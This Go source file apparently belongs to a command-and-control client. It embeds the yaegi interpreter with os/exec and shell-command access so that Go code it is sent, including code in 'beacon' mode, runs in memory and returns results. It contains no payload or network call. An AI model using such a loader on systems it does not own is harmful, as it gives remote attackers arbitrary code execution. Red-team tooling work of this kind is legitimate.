package dynamic

import (
	"fmt"
	"reflect"
	"src/Client/generic/commands"
	"src/Client/generic/logger"

	"github.com/traefik/yaegi/interp"
	"github.com/traefik/yaegi/stdlib"
	"github.com/traefik/yaegi/stdlib/unsafe"
)

type Interpreter struct {
	i                 *interp.Interpreter
	codeEvaluated     bool
	executeFunc       func([]string) (string, error)
	executeBeaconFunc func([]string, string) (string, error)
}

func NewInterpreter() *Interpreter {
	i := interp.New(interp.Options{
		GoPath: "", // Use empty string to allow standard library access
	})
	i.Use(stdlib.Symbols)
	i.Use(unsafe.Symbols) // Enable unsafe package for os/exec support
	i.Use(map[string]map[string]reflect.Value{
		"main/logger": {
			"Log": reflect.ValueOf(logger.Log),
		},
		"commands/commands": {
			"RunShellCommand": reflect.ValueOf(commands.RunShellCommand),
		},
	})
	return &Interpreter{i: i}
}

func (i *Interpreter) Execute(code string, args []string) (string, error) {
	// Only evaluate the code once and cache the function
	if !i.codeEvaluated {
		logger.Log(fmt.Sprintf("Starting code evaluation (session mode) - code size: %d bytes", len(code)))
		_, err := i.i.Eval(code)
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to evaluate code: %v", err))
			return "", fmt.Errorf("failed to evaluate code: %w", err)
		}
		logger.Log("Code successfully evaluated")

		logger.Log("Looking up main.Execute function")
		v, err := i.i.Eval("main.Execute")
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to find Execute function: %v", err))
			return "", fmt.Errorf("failed to find Execute function: %w", err)
		}

		execute, ok := v.Interface().(func([]string) (string, error))
		if !ok {
			logger.Error("Execute function has wrong signature")
			return "", fmt.Errorf("Execute function has wrong signature")
		}

		i.executeFunc = execute
		i.codeEvaluated = true
		logger.Log("Code evaluated and Execute function cached successfully")
	}

	logger.Log(fmt.Sprintf("Calling Execute function with args: %v", args))
	result, err := i.executeFunc(args)
	if err != nil {
		logger.Error(fmt.Sprintf("Execute function returned error: %v", err))
		return result, err
	}
	logger.Log(fmt.Sprintf("Execute function completed successfully - result size: %d bytes", len(result)))
	return result, nil
}

func (i *Interpreter) ExecuteFromBeacon(code string, args []string, data string) (string, error) {
	// Only evaluate the code once and cache the function
	if !i.codeEvaluated {
		logger.Log(fmt.Sprintf("Starting code evaluation (beacon mode) - code size: %d bytes, data size: %d bytes", len(code), len(data)))
		_, err := i.i.Eval(code)
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to evaluate code: %v", err))
			return "", fmt.Errorf("failed to evaluate code: %w", err)
		}
		logger.Log("Code successfully evaluated")

		logger.Log("Looking up main.ExecuteFromBeacon function")
		v, err := i.i.Eval("main.ExecuteFromBeacon")
		if err != nil {
			logger.Error(fmt.Sprintf("Failed to find ExecuteFromBeacon function: %v", err))
			return "", fmt.Errorf("failed to find ExecuteFromBeacon function: %w", err)
		}

		execute, ok := v.Interface().(func([]string, string) (string, error))
		if !ok {
			logger.Error("ExecuteFromBeacon function has wrong signature")
			return "", fmt.Errorf("ExecuteFromBeacon function has wrong signature")
		}

		i.executeBeaconFunc = execute
		i.codeEvaluated = true
		logger.Log("Code evaluated and ExecuteFromBeacon function cached successfully")
	}

	logger.Log(fmt.Sprintf("Calling ExecuteFromBeacon function with args: %v, data size: %d bytes", args, len(data)))
	result, err := i.executeBeaconFunc(args, data)
	if err != nil {
		logger.Error(fmt.Sprintf("ExecuteFromBeacon function returned error: %v", err))
		return result, err
	}
	logger.Log(fmt.Sprintf("ExecuteFromBeacon function completed successfully - result size: %d bytes", len(result)))
	return result, nil
}
